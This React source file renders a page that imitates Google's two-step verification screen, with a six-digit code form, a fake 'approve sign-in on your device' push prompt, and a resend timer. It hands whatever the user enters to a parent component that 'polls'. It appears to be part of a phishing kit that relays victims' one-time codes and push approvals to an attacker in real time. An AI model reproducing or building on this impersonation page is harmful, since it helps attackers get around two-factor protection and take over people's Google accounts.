import React, { useState, useEffect } from 'react';
import OTPInput from '../components/OTPInput';
import '../components/OTPInput.css';
import './Google2FAPage.css';

const Google2FAPage = ({ destination, onSubmit, loading }) => {
  const [code, setCode] = useState('');
  const [timer, setTimer] = useState(30);
  const isPush = destination && /gmail|notification|tap yes|open the gmail app/i.test(destination);

  useEffect(() => {
    document.title = 'Google 2FA';
  }, []);

  useEffect(() => {
    if (timer > 0) {
      const id = setTimeout(() => setTimer(timer - 1), 1000);
      return () => clearTimeout(id);
    }
  }, [timer]);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (isPush) {
      // no code needed, just notify parent to poll
      onSubmit('');
    } else if (code.length === 6) {
      onSubmit(code);
    }
  };
//since we don't show screenshots for 2FA 
  const handleResend = () => {
    setTimer(30);
    // trigger resend via parent or API
  };
  console.log('render 2FA page', { destination, isPush});
  console.log('timer', timer);
  return (
    <div className="google-page">
      <form className="google-form" onSubmit={handleSubmit}>
        {isPush ? (
          <>
            <h2>Approve sign‑in on your device</h2>
            <p>{destination || 'A notification has been sent to your phone. Please tap Yes to continue.'}</p>
            <button type="submit" disabled={loading} className="btn">
              Continue
            </button>
          </>
        ) : (
          <>
            <h2>Enter verification code</h2>
            <p>Code sent to {destination}</p>
            <OTPInput length={6} value={code} onChange={setCode} />
            <button type="submit" disabled={loading || code.length < 6} className="btn">
              Next
            </button>
            <div className="links">
              {timer === 0 ? (
                <a href="#" onClick={handleResend}>Resend code</a>
              ) : (
                <span>Resend code in {timer}s</span>
              )}
              <a href="#">Try another way</a>
            </div>
          </>
        )}
      </form>
      {loading && <div className="spinner-overlay">Loading…</div>}
    </div>
  );
};

export default Google2FAPage;
